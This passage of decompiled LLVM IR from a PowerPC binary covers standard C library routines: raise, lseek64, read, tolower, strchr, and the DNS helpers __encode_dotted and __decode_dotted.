  uselistorder label %dec_label_pc_1000a8c4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000a914, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000a880, { 1, 0 }
  uselistorder label %dec_label_pc_1000a864, { 1, 0 }
  uselistorder label %dec_label_pc_1000a7cc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a760, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000aa30 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268479048, i32* @lr, align 4
  %v0_1000aa44 = call i32 @__libc_getpid()
  %v0_1000aa4c = load i32, i32* @r29, align 4
  store i32 %v0_1000aa30, i32* @lr, align 4
  %v2_1000aa5c = call i32 @kill(i32 %v0_1000aa44, i32 %v0_1000aa4c)
  ret i32 %v2_1000aa5c

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000aa60 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000aa8c = call i32 @__asm_mfcr()
  %v1_1000aa90 = and i32 %v0_1000aa8c, 268435456
  %v3_1000aa90 = icmp eq i32 %v1_1000aa90, 0
  store i32 %v0_1000aa8c, i32* %r31.global-to-local, align 4
  store i32 %v0_1000aa8c, i32* %r0.global-to-local, align 4
  br i1 %v3_1000aa90, label %dec_label_pc_1000aab4, label %dec_label_pc_1000aaa4

dec_label_pc_1000aaa4:                            ; preds = %entry
  %v0_1000aaa4 = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000aaac = load i32, i32* %r31.global-to-local, align 4
  %v2_1000aaac = inttoptr i32 %v0_1000aaa4 to i32*
  store i32 %v0_1000aaac, i32* %v2_1000aaac, align 4
  %v0_1000aab8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000aab8

dec_label_pc_1000aab4:                            ; preds = %entry
  %v3_1000aa9c = icmp eq i32 %v0_1000aa8c, 0
  br i1 %v3_1000aa9c, label %dec_label_pc_1000aac4, label %dec_label_pc_1000aab8

dec_label_pc_1000aab8:                            ; preds = %dec_label_pc_1000aab4, %dec_label_pc_1000aaa4
  %v0_1000aab8 = phi i32 [ %v0_1000aa8c, %dec_label_pc_1000aab4 ], [ %v0_1000aab8.pre, %dec_label_pc_1000aaa4 ]
  %tmp = icmp slt i32 %v0_1000aab8, 0
  %v1_1000aabc = zext i1 %tmp to i32
  %v2_1000aabc = ashr i32 %v0_1000aab8, 31
  %v3_1000aabc = and i32 %v2_1000aabc, -2
  %v4_1000aabc = or i32 %v3_1000aabc, %v1_1000aabc
  br label %dec_label_pc_1000aacc

dec_label_pc_1000aac4:                            ; preds = %dec_label_pc_1000aab4
  %v3_1000aac4 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000aacc

dec_label_pc_1000aacc:                            ; preds = %dec_label_pc_1000aab8, %dec_label_pc_1000aac4
  %v0_1000aadc = phi i32 [ %v4_1000aabc, %dec_label_pc_1000aab8 ], [ %v3_1000aac4, %dec_label_pc_1000aac4 ]
  store i32 %v0_1000aa60, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000aadc

; uselistorder directives
  uselistorder i32 %v0_1000aab8, { 1, 0 }
  uselistorder i32 %v0_1000aa8c, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 8, 9, 10, 1, 0, 2, 7, 3, 4, 11, 12, 5, 13, 14, 15, 17, 18, 16, 19, 6 }
  uselistorder i32 31, { 22, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 23, 24, 1, 2, 3, 20, 21, 25, 26, 27, 43, 44, 4, 5, 0, 6, 28, 29, 30, 47, 48, 45, 46, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 19, 7, 8 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_1000aacc, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000aaf8 = call i32 @__asm_mfcr()
  %v1_1000aafc = and i32 %v0_1000aaf8, 268435456
  %v3_1000aafc = icmp eq i32 %v1_1000aafc, 0
  store i32 %v0_1000aaf8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000aafc, label %dec_label_pc_1000ab14, label %dec_label_pc_1000ab08

dec_label_pc_1000ab08:                            ; preds = %entry
  %v0_1000ab08 = call i32 @__errno_location()
  %v0_1000ab0c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ab0c = inttoptr i32 %v0_1000ab08 to i32*
  store i32 %v0_1000ab0c, i32* %v2_1000ab0c, align 4
  br label %dec_label_pc_1000ab14

dec_label_pc_1000ab14:                            ; preds = %entry, %dec_label_pc_1000ab08
  %v0_1000ab24 = phi i32 [ %v0_1000aaf8, %entry ], [ -1, %dec_label_pc_1000ab08 ]
  ret i32 %v0_1000ab24

; uselistorder directives
  uselistorder i32 ()* @__errno_location, { 45, 33, 44, 63, 62, 61, 43, 42, 32, 31, 41, 20, 19, 25, 38, 30, 29, 24, 18, 17, 15, 23, 14, 13, 12, 11, 10, 9, 8, 4, 37, 5, 7, 6, 50, 49, 60, 59, 58, 35, 34, 3, 2, 28, 27, 26, 0, 40, 39, 16, 48, 47, 22, 57, 21, 56, 55, 46, 36, 1, 54, 53, 52, 51 }
  uselistorder i32 268435456, { 5, 10, 6, 15, 11, 16, 18, 12, 19, 20, 21, 22, 23, 24, 25, 26, 8, 7, 17, 2, 3, 13, 0, 14, 1, 4, 9, 27 }
  uselistorder label %dec_label_pc_1000ab14, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000ab28 = add i32 %arg1, 128
  %v1_1000ab2c = mul i32 %arg1, 2
  %v2_1000ab30 = icmp ugt i32 %v1_1000ab28, 383
  %v0_1000ab34 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000ab30, i32 %v0_1000ab34)
  %v3_1000ab3c = load i32, i32* bitcast (i32** @global_var_1001d810.380 to i32*), align 4
  %v2_1000ab40 = add i32 %v1_1000ab2c, %v3_1000ab3c
  %v3_1000ab40 = inttoptr i32 %v2_1000ab40 to i16*
  %v4_1000ab40 = load i16, i16* %v3_1000ab40, align 2
  %v5_1000ab40 = sext i16 %v4_1000ab40 to i32
  ret i32 %v5_1000ab40

; uselistorder directives
  uselistorder i32 128, { 8, 0, 1, 3, 18, 19, 4, 5, 9, 10, 11, 12, 13, 6, 14, 15, 16, 2, 7, 17 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000ab48 = urem i32 %arg1, 256
  store i32 %v1_1000ab48, i32* %r4.global-to-local, align 4
  %v0_1000ab682 = load i32, i32* @r3, align 4
  %v1_1000ab683 = urem i32 %v0_1000ab682, 4
  %v3_1000ab685 = icmp eq i32 %v1_1000ab683, 0
  br i1 %v3_1000ab685, label %dec_label_pc_1000ab70, label %dec_label_pc_1000ab50

dec_label_pc_1000ab50:                            ; preds = %entry, %dec_label_pc_1000ab64
  %v1_1000ab54 = phi i32 [ %v0_1000ab70.pre, %dec_label_pc_1000ab64 ], [ %v1_1000ab48, %entry ]
  %v0_1000ab50 = phi i32 [ %v1_1000ab64, %dec_label_pc_1000ab64 ], [ %v0_1000ab682, %entry ]
  %v1_1000ab50 = inttoptr i32 %v0_1000ab50 to i8*
  %v2_1000ab50 = load i8, i8* %v1_1000ab50, align 1
  %v3_1000ab50 = zext i8 %v2_1000ab50 to i32
  %v4_1000ab54 = icmp eq i32 %v3_1000ab50, %v1_1000ab54
  %v3_1000ab58 = icmp eq i8 %v2_1000ab50, 0
  %v0_1000ab5c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000ab54, i32 %v0_1000ab5c)
  br i1 %v3_1000ab58, label %dec_label_pc_1000ac40, label %dec_label_pc_1000ab64

dec_label_pc_1000ab64:                            ; preds = %dec_label_pc_1000ab50
  %v0_1000ab64 = load i32, i32* @r3, align 4
  %v1_1000ab64 = add i32 %v0_1000ab64, 1
  store i32 %v1_1000ab64, i32* @r3, align 4
  %v1_1000ab68 = urem i32 %v1_1000ab64, 4
  %v3_1000ab68 = icmp eq i32 %v1_1000ab68, 0
  %v0_1000ab70.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000ab68, label %dec_label_pc_1000ab70, label %dec_label_pc_1000ab50

dec_label_pc_1000ab70:                            ; preds = %dec_label_pc_1000ab64, %entry
  %v0_1000ab8810 = phi i32 [ %v0_1000ab682, %entry ], [ %v1_1000ab64, %dec_label_pc_1000ab64 ]
  %v0_1000ab70 = phi i32 [ %v1_1000ab48, %entry ], [ %v0_1000ab70.pre, %dec_label_pc_1000ab64 ]
  %v1_1000ab70 = mul i32 %v0_1000ab70, 256
  %v2_1000ab78 = or i32 %v1_1000ab70, %v0_1000ab70
  %v1_1000ab80 = mul i32 %v2_1000ab78, 65536
  %v2_1000ab84 = or i32 %v1_1000ab80, %v2_1000ab78
  br label %dec_label_pc_1000ab88

dec_label_pc_1000ab88:                            ; preds = %dec_label_pc_1000ab88, %dec_label_pc_1000ac3c, %dec_label_pc_1000ab70
  %v0_1000abe0 = phi i32 [ %v0_1000ab8810, %dec_label_pc_1000ab70 ], [ %v1_1000ab8c, %dec_label_pc_1000ac3c ], [ %v1_1000ab8c, %dec_label_pc_1000ab88 ]
  %v1_1000ab88 = inttoptr i32 %v0_1000abe0 to i32*
  %v2_1000ab88 = load i32, i32* %v1_1000ab88, align 4
  %v1_1000ab8c = add i32 %v0_1000abe0, 4
  %v2_1000ab94 = xor i32 %v2_1000ab88, %v2_1000ab84
  %v1_1000ab98 = add i32 %v2_1000ab88, 2130640639
  %v2_1000aba0 = xor i32 %v1_1000ab98, %v2_1000ab88
  %v1_1000aba4 = add i32 %v2_1000ab94, 2130640639
  %v2_1000aba8 = and i32 %v2_1000aba0, -2130640640
  %v3_1000aba8 = xor i32 %v2_1000aba8, -2130640640
  %v2_1000abac = xor i32 %v1_1000aba4, %v2_1000ab94
  %v2_1000abb0 = and i32 %v2_1000abac, -2130640640
  %v3_1000abb0 = xor i32 %v2_1000abb0, -2130640640
  %v1_1000abbc = add i32 %v0_1000abe0, 1
  %tmp = or i32 %v3_1000abb0, %v3_1000aba8
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1000ab88, label %dec_label_pc_1000abc8

dec_label_pc_1000abc8:                            ; preds = %dec_label_pc_1000ab88
  %v2_1000abc8 = inttoptr i32 %v0_1000abe0 to i8*
  %v3_1000abc8 = load i8, i8* %v2_1000abc8, align 1
  %v4_1000abc8 = zext i8 %v3_1000abc8 to i32
  %v1_1000abcc = add i32 %v0_1000abe0, 2
  %v1_1000abd0 = add i32 %v0_1000abe0, 3
  %v4_1000abd4 = icmp eq i32 %v4_1000abc8, %v0_1000ab70
  br i1 %v4_1000abd4, label %dec_label_pc_1000abe0, label %dec_label_pc_1000abe8

dec_label_pc_1000abe0:                            ; preds = %dec_label_pc_1000abc8
  ret i32 %v0_1000abe0

dec_label_pc_1000abe8:                            ; preds = %dec_label_pc_1000abc8
  %v3_1000abd8 = icmp eq i8 %v3_1000abc8, 0
  br i1 %v3_1000abd8, label %dec_label_pc_1000ac40, label %dec_label_pc_1000abec

dec_label_pc_1000abec:                            ; preds = %dec_label_pc_1000abe8
  %v2_1000abec = inttoptr i32 %v1_1000abbc to i8*
  %v3_1000abec = load i8, i8* %v2_1000abec, align 1
  %v4_1000abec = zext i8 %v3_1000abec to i32
  %v4_1000abf0 = icmp eq i32 %v4_1000abec, %v0_1000ab70
  br i1 %v4_1000abf0, label %dec_label_pc_1000abfc, label %dec_label_pc_1000ac04

dec_label_pc_1000abfc:                            ; preds = %dec_label_pc_1000abec
  ret i32 %v1_1000abbc

dec_label_pc_1000ac04:                            ; preds = %dec_label_pc_1000abec
  %v3_1000abf4 = icmp eq i8 %v3_1000abec, 0
  br i1 %v3_1000abf4, label %dec_label_pc_1000ac40, label %dec_label_pc_1000ac08

dec_label_pc_1000ac08:                            ; preds = %dec_label_pc_1000ac04
  %v2_1000ac08 = inttoptr i32 %v1_1000abcc to i8*
  %v3_1000ac08 = load i8, i8* %v2_1000ac08, align 1
  %v4_1000ac08 = zext i8 %v3_1000ac08 to i32
  %v4_1000ac0c = icmp eq i32 %v4_1000ac08, %v0_1000ab70
  br i1 %v4_1000ac0c, label %dec_label_pc_1000ac18, label %dec_label_pc_1000ac20

dec_label_pc_1000ac18:                            ; preds = %dec_label_pc_1000ac08
  ret i32 %v1_1000abcc

dec_label_pc_1000ac20:                            ; preds = %dec_label_pc_1000ac08
  %v3_1000ac10 = icmp eq i8 %v3_1000ac08, 0
  br i1 %v3_1000ac10, label %dec_label_pc_1000ac40, label %dec_label_pc_1000ac24

dec_label_pc_1000ac24:                            ; preds = %dec_label_pc_1000ac20
  %v2_1000ac24 = inttoptr i32 %v1_1000abd0 to i8*
  %v3_1000ac24 = load i8, i8* %v2_1000ac24, align 1
  %v4_1000ac24 = zext i8 %v3_1000ac24 to i32
  %v4_1000ac28 = icmp eq i32 %v4_1000ac24, %v0_1000ab70
  br i1 %v4_1000ac28, label %dec_label_pc_1000ac34, label %dec_label_pc_1000ac3c

dec_label_pc_1000ac34:                            ; preds = %dec_label_pc_1000ac24
  ret i32 %v1_1000abd0

dec_label_pc_1000ac3c:                            ; preds = %dec_label_pc_1000ac24
  %v3_1000ac2c = icmp eq i8 %v3_1000ac24, 0
  br i1 %v3_1000ac2c, label %dec_label_pc_1000ac40, label %dec_label_pc_1000ab88

dec_label_pc_1000ac40:                            ; preds = %dec_label_pc_1000ab50, %dec_label_pc_1000ac3c, %dec_label_pc_1000ac20, %dec_label_pc_1000ac04, %dec_label_pc_1000abe8
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000ab8c, { 1, 0 }
  uselistorder i32 %v2_1000ab88, { 0, 2, 1 }
  uselistorder i32 %v0_1000abe0, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000ab78, { 1, 0 }
  uselistorder i32 %v0_1000ab70, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000ab64, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000ab682, { 2, 1, 0 }
  uselistorder i32 %v1_1000ab48, { 1, 2, 0 }
  uselistorder i32 3, { 1, 29, 30, 31, 32, 33, 34, 35, 36, 37, 2, 46, 3, 0, 8, 15, 26, 56, 55, 17, 16, 10, 18, 39, 9, 42, 4, 43, 44, 47, 48, 19, 49, 50, 5, 12, 20, 21, 22, 23, 24, 27, 28, 40, 41, 14, 6, 7, 45, 51, 52, 61, 62, 63, 57, 58, 59, 60, 11, 54, 53, 38, 25, 13 }
  uselistorder i32 -2130640640, { 3, 4, 5, 6, 0, 7, 2, 9, 1, 8, 10 }
  uselistorder i32 65536, { 0, 1, 11, 2, 3, 4, 5, 7, 6, 8, 9, 12, 10 }
  uselistorder i32 4, { 153, 4, 5, 6, 94, 111, 7, 8, 156, 154, 155, 118, 157, 158, 159, 107, 9, 160, 161, 162, 163, 164, 165, 166, 10, 167, 11, 12, 13, 112, 168, 169, 119, 170, 171, 172, 14, 15, 108, 137, 16, 17, 209, 210, 211, 212, 213, 214, 173, 120, 18, 19, 20, 247, 21, 248, 249, 121, 22, 23, 99, 24, 25, 26, 27, 28, 29, 181, 182, 122, 30, 31, 2, 32, 0, 215, 3, 33, 1, 189, 123, 34, 176, 177, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 250, 228, 100, 264, 271, 35, 36, 37, 38, 39, 251, 252, 40, 253, 41, 254, 42, 43, 131, 44, 45, 132, 46, 138, 139, 140, 148, 149, 150, 47, 133, 48, 49, 50, 134, 51, 135, 136, 192, 194, 193, 190, 191, 141, 142, 143, 144, 183, 184, 185, 186, 195, 196, 197, 187, 188, 117, 198, 124, 199, 200, 101, 52, 53, 201, 54, 202, 203, 204, 205, 206, 207, 109, 55, 208, 255, 256, 229, 56, 57, 58, 110, 59, 116, 230, 60, 61, 265, 266, 267, 125, 268, 269, 270, 62, 257, 258, 259, 97, 98, 260, 261, 126, 262, 263, 63, 64, 65, 66, 67, 68, 69, 70, 231, 71, 232, 233, 113, 234, 235, 236, 237, 238, 72, 73, 239, 240, 114, 241, 242, 115, 243, 244, 246, 74, 75, 95, 96, 245, 178, 76, 179, 127, 180, 174, 175, 128, 77, 78, 145, 79, 80, 81, 82, 83, 102, 84, 85, 86, 129, 87, 88, 103, 104, 146, 89, 147, 105, 90, 151, 106, 91, 152, 92, 93, 130 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 40, 44, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 39, 18, 19, 20, 21, 22, 23, 24, 25, 47, 26, 48, 49, 50, 27, 28, 29, 30, 31, 46, 41, 45, 32, 33, 34, 35, 36, 37, 38, 42, 43 }
  uselistorder label %dec_label_pc_1000ac40, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000ab88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ab50, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000ac4c = load i32, i32* @lr, align 4
  store i32 %v0_1000ac4c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000ac58 = load i32, i32* @r4, align 4
  store i32 %v0_1000ac58, i32* @r29, align 4
  %v0_1000ac5c = load i32, i32* @r5, align 4
  store i32 %v0_1000ac5c, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1000acc813 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1000acc813, label %dec_label_pc_1000ace4, label %dec_label_pc_1000acd8

dec_label_pc_1000ac6c:                            ; preds = %dec_label_pc_1000acd8
  store i32 268479600, i32* @lr, align 4
  %v3_1000ac6c = call i32 @__GI_strchr(i32 %v0_1000acd814, i32 46)
  store i32 %v3_1000ac6c, i32* @r30, align 4
  %v3_1000ac70 = icmp eq i32 %v3_1000ac6c, 0
  %v0_1000ac74 = load i32, i32* @r31, align 4
  store i32 %v0_1000ac74, i32* @r3, align 4
  %v2_1000ac78 = sub i32 %v3_1000ac6c, %v0_1000ac74
  store i32 %v2_1000ac78, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ac70, label %dec_label_pc_1000ac80, label %dec_label_pc_1000ac88

dec_label_pc_1000ac80:                            ; preds = %dec_label_pc_1000ac6c
  %v0_1000ac80 = call i32 @__GI_strlen()
  store i32 %v0_1000ac80, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_1000ac80, 16777216
  %v1_1000ac84 = sdiv i32 %sext, 16777216
  store i32 %v1_1000ac84, i32* %r0.global-to-local, align 4
  %v0_1000ac98.pre = load i32, i32* @r31, align 4
  %v0_1000aca8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000ac88

dec_label_pc_1000ac88:                            ; preds = %dec_label_pc_1000ac6c, %dec_label_pc_1000ac80
  %v0_1000aca8 = phi i32 [ %v3_1000ac6c, %dec_label_pc_1000ac6c ], [ %v0_1000aca8.pre, %dec_label_pc_1000ac80 ]
  %v0_1000ac98 = phi i32 [ %v0_1000ac74, %dec_label_pc_1000ac6c ], [ %v0_1000ac98.pre, %dec_label_pc_1000ac80 ]
  %v0_1000acb4 = phi i32 [ %v2_1000ac78, %dec_label_pc_1000ac6c ], [ %v1_1000ac84, %dec_label_pc_1000ac80 ]
  %v0_1000ac8c = load i32, i32* @r28, align 4
  %v1_1000ac8c = load i32, i32* %r27.global-to-local, align 4
  %v2_1000ac8c = sub i32 %v1_1000ac8c, %v0_1000ac8c
  %v1_1000ac90 = add i32 %v0_1000ac8c, 1
  store i32 %v1_1000ac90, i32* %r11.global-to-local, align 4
  %v1_1000ac94 = add i32 %v2_1000ac8c, -1
  store i32 %v0_1000ac98, i32* @r4, align 4
  %v0_1000ac9c = load i32, i32* @r29, align 4
  %v2_1000ac9c = add i32 %v0_1000ac9c, %v1_1000ac90
  store i32 %v2_1000ac9c, i32* @r3, align 4
  store i32 %v0_1000acb4, i32* @r5, align 4
  %v2_1000aca4 = icmp ult i32 %v0_1000acb4, %v1_1000ac94
  %v1_1000aca8 = add i32 %v0_1000aca8, 1
  store i32 %v1_1000aca8, i32* @r31, align 4
  %v3_1000ac88.not = icmp ne i32 %v0_1000acb4, 0
  %or.cond = and i1 %v2_1000aca4, %v3_1000ac88.not
  br i1 %or.cond, label %dec_label_pc_1000acb4, label %dec_label_pc_1000acfc

dec_label_pc_1000acb4:                            ; preds = %dec_label_pc_1000ac88
  %v3_1000acb4 = trunc i32 %v0_1000acb4 to i8
  %v4_1000acb4 = add i32 %v0_1000ac9c, %v0_1000ac8c
  %v5_1000acb4 = inttoptr i32 %v4_1000acb4 to i8*
  store i8 %v3_1000acb4, i8* %v5_1000acb4, align 1
  %v0_1000acb8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000acb8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000acb8 = add i32 %v1_1000acb8, %v0_1000acb8
  store i32 %v2_1000acb8, i32* @r28, align 4
  store i32 268479680, i32* @lr, align 4
  %v0_1000acbc = call i32 @memcpy()
  store i32 %v0_1000acbc, i32* %r3.global-to-local, align 4
  %v0_1000acc0 = load i32, i32* @r30, align 4
  %v3_1000acc0 = icmp eq i32 %v0_1000acc0, 0
  br i1 %v3_1000acc0, label %dec_label_pc_1000ace4, label %dec_label_pc_1000acb4.dec_label_pc_1000acc8_crit_edge

dec_label_pc_1000acb4.dec_label_pc_1000acc8_crit_edge: ; preds = %dec_label_pc_1000acb4
  %v0_1000acc8.pre = load i32, i32* @r31, align 4
  %v3_1000acc8 = icmp eq i32 %v0_1000acc8.pre, 0
  store i32 %v0_1000acc8.pre, i32* @r3, align 4
  br i1 %v3_1000acc8, label %dec_label_pc_1000ace4, label %dec_label_pc_1000acd8

dec_label_pc_1000acd8:                            ; preds = %entry, %dec_label_pc_1000acb4.dec_label_pc_1000acc8_crit_edge
  %v0_1000acd814 = phi i32 [ %v0_1000acc8.pre, %dec_label_pc_1000acb4.dec_label_pc_1000acc8_crit_edge ], [ %tmp, %entry ]
  %v1_1000acd8 = inttoptr i32 %v0_1000acd814 to i8*
  %v2_1000acd8 = load i8, i8* %v1_1000acd8, align 1
  %v3_1000acd8 = zext i8 %v2_1000acd8 to i32
  store i32 %v3_1000acd8, i32* %r0.global-to-local, align 4
  %v3_1000acdc = icmp eq i8 %v2_1000acd8, 0
  br i1 %v3_1000acdc, label %dec_label_pc_1000ace4, label %dec_label_pc_1000ac6c

dec_label_pc_1000ace4:                            ; preds = %dec_label_pc_1000acb4.dec_label_pc_1000acc8_crit_edge, %dec_label_pc_1000acb4, %dec_label_pc_1000acd8, %entry
  %v0_1000ace4 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_1000ace4, 1
  br i1 %tmp10, label %dec_label_pc_1000acfc, label %dec_label_pc_1000acec

dec_label_pc_1000acec:                            ; preds = %dec_label_pc_1000ace4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000acf0 = load i32, i32* @r28, align 4
  %v1_1000acf0 = add i32 %v0_1000acf0, 1
  store i32 %v1_1000acf0, i32* %r3.global-to-local, align 4
  %v1_1000acf4 = load i32, i32* @r29, align 4
  %v4_1000acf4 = add i32 %v1_1000acf4, %v0_1000acf0
  %v5_1000acf4 = inttoptr i32 %v4_1000acf4 to i8*
  store i8 0, i8* %v5_1000acf4, align 1
  %v0_1000ad10.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ad00

dec_label_pc_1000acfc:                            ; preds = %dec_label_pc_1000ac88, %dec_label_pc_1000ace4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ad00

dec_label_pc_1000ad00:                            ; preds = %dec_label_pc_1000acec, %dec_label_pc_1000acfc
  %v0_1000ad10 = phi i32 [ %v0_1000ad10.pre, %dec_label_pc_1000acec ], [ -1, %dec_label_pc_1000acfc ]
  store i32 %v0_1000ac4c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000ad10

; uselistorder directives
  uselistorder i32 %v0_1000acd814, { 1, 0 }
  uselistorder i32 %v0_1000acc8.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1000acb4, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000ac84, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_strlen, { 18, 39, 38, 17, 16, 15, 14, 12, 40, 37, 0, 36, 1, 35, 34, 33, 32, 5, 4, 31, 30, 29, 3, 2, 28, 27, 26, 10, 25, 9, 24, 23, 8, 22, 7, 13, 6, 21, 19, 20, 11 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0 }
  uselistorder i32 46, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000ad00, { 1, 0 }
  uselistorder label %dec_label_pc_1000acfc, { 1, 0 }
  uselistorder label %dec_label_pc_1000ace4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000acd8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac88, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_1000ad18 = call i32 @__asm_mfcr()
  store i32 %v0_1000ad18, i32* @r26, align 4
  %v3_1000ad24 = icmp eq i32 %v0_1000ad18, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_1000ad34 = load i32, i32* @r6, align 4
  store i32 %v0_1000ad34, i32* @r24, align 4
  br i1 %v3_1000ad24, label %dec_label_pc_1000adec, label %dec_label_pc_1000ad3c

dec_label_pc_1000ad3c:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000adc814 = load i32, i32* @r4, align 4
  %v2_1000adc815 = add i32 %v1_1000adc814, %v0_1000ad18
  %v3_1000adc816 = inttoptr i32 %v2_1000adc815 to i8*
  %v4_1000adc817 = load i8, i8* %v3_1000adc816, align 1
  %v5_1000adc818 = zext i8 %v4_1000adc817 to i32
  store i32 %v5_1000adc818, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_1000add020 = icmp eq i8 %v4_1000adc817, 0
  br i1 %v3_1000add020, label %dec_label_pc_1000addc, label %dec_label_pc_1000ad4c

dec_label_pc_1000ad4c:                            ; preds = %dec_label_pc_1000ad3c, %dec_label_pc_1000adc4
  %v3_1000adcc22 = phi i1 [ %v3_1000adcc, %dec_label_pc_1000adc4 ], [ false, %dec_label_pc_1000ad3c ]
  %v5_1000adc821 = phi i32 [ %v5_1000adc8, %dec_label_pc_1000adc4 ], [ %v5_1000adc818, %dec_label_pc_1000ad3c ]
  br i1 %v3_1000adcc22, label %dec_label_pc_1000ad54, label %dec_label_pc_1000ad50

dec_label_pc_1000ad50:                            ; preds = %dec_label_pc_1000ad4c
  %v0_1000ad50 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000ad50 = add i32 %v0_1000ad50, 1
  store i32 %v1_1000ad50, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000ad54

dec_label_pc_1000ad54:                            ; preds = %dec_label_pc_1000ad4c, %dec_label_pc_1000ad50
  %v1_1000ad54 = call i32 @__asm_rlwinm(i32 %v5_1000adc821, i32 0, i32 24, i32 25)
  %v0_1000ad58 = load i32, i32* @r4, align 4
  %v1_1000ad58 = add i32 %v0_1000ad58, 1
  store i32 %v1_1000ad58, i32* @r30, align 4
  %v3_1000ad5c = icmp eq i32 %v1_1000ad54, 192
  br i1 %v3_1000ad5c, label %dec_label_pc_1000ad64, label %dec_label_pc_1000ad84

dec_label_pc_1000ad64:                            ; preds = %dec_label_pc_1000ad54
  %v0_1000ad64 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000ad64, label %dec_label_pc_1000ad6c, label %dec_label_pc_1000ad68

dec_label_pc_1000ad68:                            ; preds = %dec_label_pc_1000ad64
  %v0_1000ad68 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000ad68 = add i32 %v0_1000ad68, 1
  store i32 %v1_1000ad68, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000ad6c

dec_label_pc_1000ad6c:                            ; preds = %dec_label_pc_1000ad64, %dec_label_pc_1000ad68
  %v0_1000ad6c = load i32, i32* @r26, align 4
